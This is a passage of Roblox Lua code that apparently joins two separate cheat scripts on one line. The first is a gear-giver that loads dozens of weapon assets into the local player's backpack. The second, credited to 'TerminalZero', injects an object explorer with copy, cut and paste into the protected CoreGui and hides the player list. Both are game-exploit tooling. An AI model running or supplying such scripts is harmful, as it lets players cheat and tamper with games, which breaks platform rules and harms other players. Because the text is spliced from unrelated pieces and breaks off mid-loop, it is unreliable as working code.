                                for _, v in pairs(insrt66:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt67 = game:GetService("InsertService"):LoadAsset(14516975)--superdisruptor
                                for _, v in pairs(insrt67:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt68 = game:GetService("InsertService"):LoadAsset(18268645)--disintergrexgun
                                for _, v in pairs(insrt68:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt69 = game:GetService("InsertService"):LoadAsset(18462637)--windstaff
                                for _, v in pairs(insrt69:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt70 = game:GetService("InsertService"):LoadAsset(13838639)--atomicdisintegrator
                                for _, v in pairs(insrt70:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt71 = game:GetService("InsertService"):LoadAsset(33867016)--handcannon
                                for _, v in pairs(insrt71:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt72 = game:GetService("InsertService"):LoadAsset(33879504)--flamethrower2
                                for _, v in pairs(insrt72:GetChildren()) do
                                v.Name='FlameThrower2'
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt73 = game:GetService("InsertService"):LoadAsset(35366155)--hypnocannon
                                for _, v in pairs(insrt73:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt74 = game:GetService("InsertService"):LoadAsset(28275809)--scythe
                                for _, v in pairs(insrt74:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt75 = game:GetService("InsertService"):LoadAsset(31839203)--rcformula
                                for _, v in pairs(insrt75:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt76 = game:GetService("InsertService"):LoadAsset(11373617)--woodlandsstaff
                                for _, v in pairs(insrt76:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt77 = game:GetService("InsertService"):LoadAsset(22969230)--emraldscatterblaster
                                for _, v in pairs(insrt77:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt78 = game:GetService("InsertService"):LoadAsset(21420014)--scatterblaster
                                for _, v in pairs(insrt78:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt79 = game:GetService("InsertService"):LoadAsset(36913601)--broom
                                for _, v in pairs(insrt79:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt80 = game:GetService("InsertService"):LoadAsset(48847374)--positronicarmcannon
                                for _, v in pairs(insrt80:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt81 = game:GetService("InsertService"):LoadAsset(71422327)--frosthammer
                                for _, v in pairs(insrt81:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt82 = game:GetService("InsertService"):LoadAsset(69947367)--dualaxe
                                for _, v in pairs(insrt82:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt83 = game:GetService("InsertService"):LoadAsset(33382711)--gloomystaff
                                for _, v in pairs(insrt83:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt84 = game:GetService("InsertService"):LoadAsset(11719016)--blowdryer
                                for _, v in pairs(insrt84:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt85 = game:GetService("InsertService"):LoadAsset(12902404)--tnt
                                for _, v in pairs(insrt85:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt86 = game:GetService("InsertService"):LoadAsset(65469882)--fist
                                for _, v in pairs(insrt86:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt87 = game:GetService("InsertService"):LoadAsset(65469908)--scullcracker
                                for _, v in pairs(insrt87:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt88 = game:GetService("InsertService"):LoadAsset(33383241)--remotemine
                                for _, v in pairs(insrt88:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt89 = game:GetService("InsertService"):LoadAsset(32353654)--moonwalkdance
                                for _, v in pairs(insrt89:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt90 = game:GetService("InsertService"):LoadAsset(32355966)--winsomewand
                                for _, v in pairs(insrt90:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt91 = game:GetService("InsertService"):LoadAsset(35293856)--atomizer
                                for _, v in pairs(insrt91:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt92 = game:GetService("InsertService"):LoadAsset(50938773)--taserblade
                                for _, v in pairs(insrt92:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt93 = game:GetService("InsertService"):LoadAsset(32858662)--icestaff
                                for _, v in pairs(insrt93:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt94 = game:GetService("InsertService"):LoadAsset(16469499)--highphaser
                                for _, v in pairs(insrt94:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt95 = game:GetService("InsertService"):LoadAsset(47871646)--tornade
                                for _, v in pairs(insrt95:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt96 = game:GetService("InsertService"):LoadAsset(35366215)--roboarm
                                for _, v in pairs(insrt96:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt97 = game:GetService("InsertService"):LoadAsset(64160547)--hoverboard
                                for _, v in pairs(insrt97:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt98 = game:GetService("InsertService"):LoadAsset(54694334)--vilethorn
                                for _, v in pairs(insrt98:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt99 = game:GetService("InsertService"):LoadAsset(69210321)--darkstaff
                                for _, v in pairs(insrt99:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt100 = game:GetService("InsertService"):LoadAsset(62827121)--evilwand
                                for _, v in pairs(insrt100:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt101 = game:GetService("InsertService"):LoadAsset(18010691)--awestar
                                for _, v in pairs(insrt101:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt102 = game:GetService("InsertService"):LoadAsset(51302649)--swordandshield
                                for _, v in pairs(insrt102:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                local insrt103 = game:GetService("InsertService"):LoadAsset(10760425)--sparkstaff
                                for _, v in pairs(insrt103:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								local insrt104 = game:GetService("InsertService"):LoadAsset(73799348)--undoingaxe
                                for _, v in pairs(insrt104:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								local insrt105 = game:GetService("InsertService"):LoadAsset(73232786)--dragonstaff
                                for _, v in pairs(insrt105:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								local insrt106 = game:GetService("InsertService"):LoadAsset(73232825)--screeshpotion
                                for _, v in pairs(insrt106:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								local insrt107 = game:GetService("InsertService"):LoadAsset(73265108)--dualcannon
                                for _, v in pairs(insrt107:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								local insrt108 = game:GetService("InsertService"):LoadAsset(74385438)--gravitron
                                for _, v in pairs(insrt108:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								local insrt109 = game:GetService("InsertService"):LoadAsset(74385386)--razevenge
                                for _, v in pairs(insrt109:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								local insrt110 = game:GetService("InsertService"):LoadAsset(74385418)--glorylauncher
                                for _, v in pairs(insrt110:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
								local insrt111 = game:GetService("InsertService"):LoadAsset(73888479)--spikesplosion
                                for _, v in pairs(insrt111:GetChildren()) do
                                if not(game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name))then
                                        v:Clone().Parent = game.Players.LocalPlayer.Backpack
                                end
                                end
                                wait()
                                if (game.Players.LocalPlayer.Backpack:FindFirstChild("LoadingGears..."))then
                                        game.Players.LocalPlayer.Backpack:FindFirstChild("LoadingGears..."):remove()
                                end
                        end))
                end
        end))
end)  --[ Explorer Plugin V2 By TerminalZero ]--

Properties = {nil,"Name","Parent","ClassName","BrickColor","Transparency","Reflectance","CreatorId","VertexColor","Volume","Ticket","AccountAge","VideoQualitySettings","UploadSetting","TweenStatus","TopBottom","TickCountSampleMethod","ThreadPoolConfig","SurfaceType","SurfaceConstrait","Style","Stuff","Status","SpecialKey","SoundType","SleepAdjustMethod","SizeConstraint","Shadow","SavedQualitySetting","ReverbType","Resolution","QualityLevel","PyrimidSides","PrivilegeType","PrismSides","PriorityMethod","PlayerChatType","PhysicsSendMethod","PhysicsRecieveMethod","PartType","PacketReliability","NormalId","MoveState","MeshType","MaterialQuality","LevelOfDetailSetting","LeftRight","KeywordFilterType","JointType","InputType","InOut","HandlesStyle","GraphicsMode","GeometryQuality","Genre","GearType","GearGenreSetting","FunctionalTestResult","FriendStatus","FriendRequestEvent","FramerateManagerMode","FrameStyle","ErrorReporting","PhysicsThrottle","Enviromental","EasingStyle","EasingDirection","DialogTone","DialogPurpose","D3DFORMAT","D3DDEVTYPE","CreatorType","ControlMode","ConcurrencyModel","ChatStyle","ChatMode","ChatColor","CenterDialogType","CellOrientation","CellMaterial","CellBlock","CameraType","ButtonStyle","Button","BuildPermission","BodyPart","BinType","Bevels","Axis","Antialiasing","AnimationPriority","AffectType","ActionType","AASamples","Source","ScriptsDisabled","GarbageCollectionLimit","GarbageCollectionFrequency","RobloxLocked","Version","AttachmentForward","AttachmentPos","AttachmentRight","AttachmentUp","AnimationId","HeadColor","RightArmColor","LeftArmColor","TorsoColor","LeftLegColor","RightLegColor","Value","CameraType","CameraSubject","BaseTextureId","BodyPart","MeshId","OverlayTextureId","MaxActivationDistance","Shiny","Specular","Texture","Face","GripForward","GripPos","GripRight","GripUp","TextureId","TeamColor","Enabled","Position","CFrame","Material","RotVelocity","Velocity","Anchored","CanCollide","Locked","Elasticity","Friction","Shape","Size","formFactor","BackSurface","BottomSurface","FrontSurface","LeftSurface","RightSurface","TopSurface","AbsolutePosition","AbsoluteSize","Active","BackgroundColor3","BackgroundTransparency","BorderColor3","BorderSizePixel","SizeConstraint","Visible","ZIndex","C0","C1","Part0","Part1","BinType","LeftLeg","RightLeg","Torso","Health","MaxHealth","WalkSpeed","Jump","PlatformStand","Sit","AutoButtonColor","Image","LinkedSource","Disabled","Text","PrimaryPart","CurrentAngle","DesiredAngle","MaxVelocity","PantsTemplate","ShirtTemplate","SoundId","Pitch","IsPlaying","IsPaused","Looped","PlayOnRemove","StudsPerTileU","StudsPerTileV","userId","BubbleChat","ClassicChat","MaxPlayers","NumPlayers","LocalPlayer","CharacterAppearance","Character","CurrentCamera","Ambient","Brightness","ColorShift_Bottom","ColorShift_Top","ShadowColor","GeographicLatitude","TimeOfDay","AmbientReverb","DistanceFactor","DopplerScale","RolloffScale","Color","angularvelocity","maxTorque","Offset","Scale","Heat","Range","Angle","DataCost"}

if script ~= nil then
	if Game:FindFirstChild("NetworkClient") ~= nil then
		repeat wait() until Game.Players.LocalPlayer ~= nil
	end
end

if game:GetService("CoreGui"):FindFirstChild("ExplorerButton") == nil then
local screengui = Instance.new("ScreenGui")
screengui.Parent = game:GetService("CoreGui")
screengui.Name = "ExplorerButton"
local text = Instance.new("TextButton")
text.Parent = screengui
text.Active = true
text.BackgroundColor = BrickColor.new("Really black")
text.BorderColor3 = Color3.new(255/255,0/0,0/0)
text.Position = UDim2.new(0.7,0,0.97,0)
text.Size = UDim2.new(0.1,0,0.025,0)
text.Text = "Explorer"
text.TextColor3 = Color3.new(1,1,1)

LocalPlayerExists = false

if Game:GetService("Players").LocalPlayer ~= nil then -- Click
LocalPlayerExists = true
end

text.MouseButton1Down:connect(function()
if game:GetService("CoreGui"):FindFirstChild("ExplorerGui") == nil then
pcall(function()
	Game.CoreGui.RobloxGui.PlayerListScreen.Visible = false
end)

ItemGuis = {}
PropGuis = {}
ScrollPlaces = {}
MouseFunction = nil
AddedFunction = nil
RemovedFunction = nil
Selection = nil
ExplorerGui = nil
CopiedItem = nil
AddingConnection = nil
RemovingConnection = nil
Mouse = nil
ExpScrollNumber = 1
PropScrollNumber = 1
ViewGui = "Explorer"

if Game.Players.LocalPlayer ~= nil then
	Mouse = Game.Players.LocalPlayer:GetMouse()
end

Base = "http://www.roblox.com/asset/?id="
Images = {Value=40332408,Sound=40332463,Script=40332546,ScreenGui=40332596,Part=40332760,SpawnLocation=117933272,Nil=40332825,Model=40332865,Message=40332942,LocalScript=40332996,Joint=40333049,Frame=40333121,Camera=40333217,Backpack=40333260,Player=40332674,Body=40339623,HopperBin=40339572,Tool=40339513,Workspace=40484518,Mesh=40484580,Property=40493937,Animation=40531758,Hat=40531808,Humanoid=40531903,Light=117825710,Decal=117930421,Shirt=117931182,Pants=117931169,Terrain=117931310,ForceField=117931567,Seat=117931937,BillboardGui=117932485,Texture=118002183}

function SetImage(Par,class)
if (class=="IntValue") or (class=="BoolValue") or (class=="StringValue") or (class=="ObjectValue") or (class=="CFrameValue") or (class=="Vector3Value") or (class=="NumberValue") or (class=="RayValue") or (class=="Color3Value") or (class=="BrickColorValue") then
CreateImageLabel(Par,Base..Images.Value)
elseif (class=="Sound") or (class=="StockSound") or (class=="SoundService") then
CreateImageLabel(Par,Base..Images.Sound)
elseif (class=="Script") then
CreateImageLabel(Par,Base..Images.Script)
elseif (class=="ScreenGui") or (class=="GuiMain") then
CreateImageLabel(Par,Base..Images.ScreenGui)
elseif (class=="BillboardGui") then
CreateImageLabel(Par,Base..Images.BillboardGui)
elseif (class=="Part") or (class=="WedgePart") or (class=="TrussPart") or (class=="SkateboardPlatform") then
CreateImageLabel(Par,Base..Images.Part)
elseif (class=="SpawnLocation") then
CreateImageLabel(Par,Base..Images.SpawnLocation)
elseif (class=="Model") then
CreateImageLabel(Par,Base..Images.Model)
elseif (class=="Hint") or (class=="Message") then
CreateImageLabel(Par,Base..Images.Message)
elseif (class=="LocalScript") or (class=="CoreScript") or (class=="StarterScript") then
CreateImageLabel(Par,Base..Images.LocalScript)
elseif (class=="Weld") or (class=="Snap") or (class=="Glue") or (class=="Rotate") or (class=="RotateP") or (class=="RotateV") or (class=="JointsService") then
CreateImageLabel(Par,Base..Images.Joint)
elseif (class=="Frame") or (class=="TextLabel") or (class=="TextButton") or (class=="TextBox") or (class=="ImageButton") or (class=="ImageLabel") then
CreateImageLabel(Par,Base..Images.Frame)
elseif (class=="Camera") then
CreateImageLabel(Par,Base..Images.Camera)
elseif (class=="Backpack") or (class=="StarterGear") or (class=="StarterPack") or (class=="StarterGui") or (class=="PlayerGui") then
CreateImageLabel(Par,Base..Images.Backpack)
elseif (class=="Player") or (class=="PseudoPlayer") or (class=="Players") then
CreateImageLabel(Par,Base..Images.Player)
elseif (class=="BodyPosition") or (class=="BodyGyro") or (class=="BodyVelocity") or (class=="BodyThrust") or (class=="BodyForce") or (class=="RocketPropulsion") then
CreateImageLabel(Par,Base..Images.Body)
elseif (class=="HopperBin") then
CreateImageLabel(Par,Base..Images.HopperBin)
elseif (class=="Tool") then
CreateImageLabel(Par,Base..Images.Tool)
elseif (class=="Workspace") then
CreateImageLabel(Par,Base..Images.Workspace)
elseif (class=="BlockMesh") or (class=="SpecialMesh") or (class=="CylinderMesh") then
CreateImageLabel(Par,Base..Images.Mesh)
elseif (class=="Animation") or (class=="CharacterMesh") then
CreateImageLabel(Par,Base..Images.Animation)
elseif (class=="Hat") then
CreateImageLabel(Par,Base..Images.Hat)
elseif (class=="Humanoid") then
CreateImageLabel(Par,Base..Images.Humanoid)
elseif (class=="Lighting") then
CreateImageLabel(Par,Base..Images.Light)
elseif (class=="PointLight") or (class=="SpotLight") then
CreateImageLabel(Par,Base..Images.Light)
elseif (class=="Decal") then
CreateImageLabel(Par,Base..Images.Decal)
elseif (class=="Texture") then
CreateImageLabel(Par,Base..Images.Texture)
elseif (class=="Terrain") then
CreateImageLabel(Par,Base..Images.Terrain)
elseif (class=="Shirt") then
CreateImageLabel(Par,Base..Images.Shirt)
elseif (class=="Pants") then
CreateImageLabel(Par,Base..Images.Pants)
elseif (class=="ForceField") then
CreateImageLabel(Par,Base..Images.ForceField)
elseif (class=="Seat") or (class=="VehicleSeat") then
CreateImageLabel(Par,Base..Images.Seat)
else CreateImageLabel(Par,Base..Images.Nil)
end
end

function CreateImageLabel(Par,image)
Par.Image = image
end

function GetProperties(Object,Table)
local Return = {}
local function C() end
for i=1,#Table do
if pcall(function() C(Object[Table[i]]) end) then
if (Object:FindFirstChild(Table[i]) == nil) then
table.insert(Return, Table[i])
end end end
return Return
end

function CreateGuis()
	explore = Instance.new("ScreenGui",Game:GetService("CoreGui"))
	explore.Name = "ExplorerGui"
	otherframe = Instance.new("TextLabel",explore)
	otherframe.Name = "OtherFrame"
	otherframe.BackgroundColor = BrickColor.new("Really black")
	otherframe.BackgroundTransparency = 0.2
	otherframe.BorderColor = BrickColor.new("Really red")
	otherframe.Position = UDim2.new(0.8,0,0,0)
	otherframe.Size = UDim2.new(0.2,0,0.05,0)
	otherframe.Visible = true
	otherframe.ZIndex = 2
	otherframe.Draggable = true
	otherframe.Font = "ArialBold"
	otherframe.FontSize = "Size14"
	otherframe.TextColor = BrickColor.new("Institutional white")
	otherframe.TextXAlignment = "Center"
	otherframe.Active = true

	expbutton = Instance.new("TextButton",otherframe)
	expbutton.Name = "ExpButton"
	expbutton.BackgroundColor = BrickColor.new("Really black")
	expbutton.BackgroundTransparency = 0.2
	expbutton.BorderColor = BrickColor.new("Really red")
	expbutton.Position = UDim2.new(0,0,16.25,0)
	expbutton.Size = UDim2.new(0.45,0,0.75,0)
	expbutton.Visible = true
	expbutton.ZIndex = 2
	expbutton.Draggable = false
	expbutton.Font = "ArialBold"
	expbutton.FontSize = "Size14"
	expbutton.Text = "Explorer"
	expbutton.TextColor = BrickColor.new("Institutional white")
	expbutton.TextXAlignment = "Center"

	propsbutton = Instance.new("TextButton",otherframe)
	propsbutton.Name = "PropsButton"
	propsbutton.BackgroundColor = BrickColor.new("Really black")
	propsbutton.BackgroundTransparency = 0.2
	propsbutton.BorderColor = BrickColor.new("Really red")
	propsbutton.Position = UDim2.new(0.45,0,16.25,0)
	propsbutton.Size = UDim2.new(0.45,0,0.75,0)
	propsbutton.Visible = true
	propsbutton.ZIndex = 2
	propsbutton.Draggable = false
	propsbutton.Font = "ArialBold"
	propsbutton.FontSize = "Size14"
	propsbutton.Text = "Properties"
	propsbutton.TextColor = BrickColor.new("Institutional white")
	propsbutton.TextXAlignment = "Center"

	exframe = Instance.new("Frame",otherframe)
	exframe.Name = "ExplorerFrame"
	exframe.BackgroundColor = BrickColor.new("Really black")
	exframe.BackgroundTransparency = 0.4
	exframe.BorderColor = BrickColor.new("Really red")
	exframe.Position = UDim2.new(0,0,1,0)
	exframe.Size = UDim2.new(1,0,16,0)
	exframe.Visible = true
	exframe.ZIndex = 1
	exframe.Draggable = false
	exframe.Active = true

	list = Instance.new("Frame",exframe)
	list.Name = "List"
	list.BackgroundColor = BrickColor.new("Really black")
	list.BackgroundTransparency = 0.8
	list.BorderColor = BrickColor.new("Really red")
	list.Position = UDim2.new(0,0,0.1,0)
	list.Size = UDim2.new(0.9,0,0.85,0)
	list.Visible = true
	list.ZIndex = 1
	list.Draggable = false

	back = Instance.new("TextButton",exframe)
	back.Name = "BackButton"
	back.BackgroundColor = BrickColor.new("Really black")
	back.BackgroundTransparency = 0.6
	back.BorderColor = BrickColor.new("Really red")
	back.Position = UDim2.new(0,0,0.05,0)
	back.Size = UDim2.new(1,0,0.05,0)
	back.Visible = true
	back.ZIndex = 1
	back.Draggable = false
	back.Font = "ArialBold"
	back.FontSize = "Size14"
	back.Text = "Object's Parent is Nil"
	back.TextColor = BrickColor.new("Institutional white")
	back.TextXAlignment = "Center"

	search = Instance.new("TextBox",exframe)
	search.Name = "SearchBox"
	search.BackgroundColor = BrickColor.new("Really black")
	search.BackgroundTransparency = 0.6
	search.BorderColor = BrickColor.new("Really red")
	search.Position = UDim2.new(0,0,0,0)
	search.Size = UDim2.new(1,0,0.05,0)
	search.Visible = true
	search.ZIndex = 1
	search.Draggable = false
	search.Font = "ArialBold"
	search.FontSize = "Size14"
	search.Text = "Search in Place1"
	search.TextColor = BrickColor.new("Institutional white")
	search.TextXAlignment = "Center"

	upbutton = Instance.new("TextButton",otherframe)
	upbutton.Name = "UpButton"
	upbutton.BackgroundColor = BrickColor.new("Really black")
	upbutton.BackgroundTransparency = 0.6
	upbutton.BorderColor = BrickColor.new("Really red")
	upbutton.Position = UDim2.new(0.9,0,1.75,0)
	upbutton.Size = UDim2.new(0.1,0,0.75,0)
	upbutton.Visible = true
	upbutton.ZIndex = 2
	upbutton.Draggable = false
	upbutton.Font = "ArialBold"
	upbutton.FontSize = "Size12"
	upbutton.Text = [[/\]]
	upbutton.TextColor = BrickColor.new("Institutional white")
	upbutton.TextXAlignment = "Center"

	downbutton = Instance.new("TextButton",otherframe)
	downbutton.Name = "DownButton"
	downbutton.BackgroundColor = BrickColor.new("Really black")
	downbutton.BackgroundTransparency = 0.6
	downbutton.BorderColor = BrickColor.new("Really red")
	downbutton.Position = UDim2.new(0.9,0,16.25,0)
	downbutton.Size = UDim2.new(0.1,0,0.75,0)
	downbutton.Visible = true
	downbutton.ZIndex = 2
	downbutton.Draggable = false
	downbutton.Font = "ArialBold"
	downbutton.FontSize = "Size12"
	downbutton.Text = [[\/]]
	downbutton.TextColor = BrickColor.new("Institutional white")
	downbutton.TextXAlignment = "Center"

	refreshbutton = Instance.new("ImageButton",exframe)
	refreshbutton.Name = "RefreshButton"
	refreshbutton.BackgroundColor = BrickColor.new("Really black")
	refreshbutton.BackgroundTransparency = 0.6
	refreshbutton.BorderColor = BrickColor.new("Really red")
	refreshbutton.Position = UDim2.new(0.9,0,0,0)
	refreshbutton.Size = UDim2.new(0.1,0,0.05,0)
	refreshbutton.Visible = true
	refreshbutton.ZIndex = 2
	refreshbutton.Draggable = false
	refreshbutton.Image = "http://www.roblox.com/asset/?id=21367268"

	options = Instance.new("Frame",list)
	options.Name = "Options"
	options.BackgroundColor = BrickColor.new("Really black")
	options.BackgroundTransparency = 0.4
	options.BorderColor = BrickColor.new("Really red")
	options.Position = UDim2.new(-1,0,0,0)
	options.Size = UDim2.new(0.5,0,0.25,0)
	options.Visible = false
	options.ZIndex = 3
	options.Draggable = false

	copybutton = Instance.new("TextButton",options)
	copybutton.Name = "CopyButton"
	copybutton.BackgroundColor = BrickColor.new("Really black")
	copybutton.BackgroundTransparency = 0.6
	copybutton.BorderColor = BrickColor.new("Really red")
	copybutton.Position = UDim2.new(0,0,0,0)
	copybutton.Size = UDim2.new(1,0,0.333,0)
	copybutton.Visible = true
	copybutton.ZIndex = 3
	copybutton.Draggable = false
	copybutton.Font = "ArialBold"
	copybutton.FontSize = "Size12"
	copybutton.Text = "Copy"
	copybutton.TextColor = BrickColor.new("Institutional white")
	copybutton.TextXAlignment = "Center"

	pastebutton = Instance.new("TextButton",options)
	pastebutton.Name = "PasteButton"
	pastebutton.BackgroundColor = BrickColor.new("Really black")
	pastebutton.BackgroundTransparency = 0.6
	pastebutton.BorderColor = BrickColor.new("Really red")
	pastebutton.Position = UDim2.new(0,0,0.333,0)
	pastebutton.Size = UDim2.new(1,0,0.333,0)
	pastebutton.Visible = true
	pastebutton.ZIndex = 3
	pastebutton.Draggable = false
	pastebutton.Font = "ArialBold"
	pastebutton.FontSize = "Size12"
	pastebutton.Text = "Paste"
	pastebutton.TextColor = BrickColor.new("Institutional white")
	pastebutton.TextXAlignment = "Center"

	cutbutton = Instance.new("TextButton",options)
	cutbutton.Name = "CutButton"
	cutbutton.BackgroundColor = BrickColor.new("Really black")
	cutbutton.BackgroundTransparency = 0.6
	cutbutton.BorderColor = BrickColor.new("Really red")
	cutbutton.Position = UDim2.new(0,0,0.333*2,0)
	cutbutton.Size = UDim2.new(1,0,0.333,0)
	cutbutton.Visible = true
	cutbutton.ZIndex = 3
	cutbutton.Draggable = false
	cutbutton.Font = "ArialBold"
	cutbutton.FontSize = "Size12"
	cutbutton.Text = "Cut"
	cutbutton.TextColor = BrickColor.new("Institutional white")
	cutbutton.TextXAlignment = "Center"

	config = Instance.new("ObjectValue",options)
	config.Name = "ConfiguredObject"
	config.Value = nil

	sel = Instance.new("ObjectValue",exframe)
	sel.Name = "Selection"
	sel.Value = Game
	Selection = sel

	highlight = Instance.new("SelectionBox",Game:GetService("CoreGui"))
	highlight.Name = "ObjectHighlight"
	highlight.Color = BrickColor.new("Bright blue")

	for i=0,19 do
		item = Instance.new("Frame",list)
		item.Name = "Item"
		item.BackgroundColor = BrickColor.new("Really black")
		item.BackgroundTransparency = 0.8
		item.BorderColor = BrickColor.new("Really red")
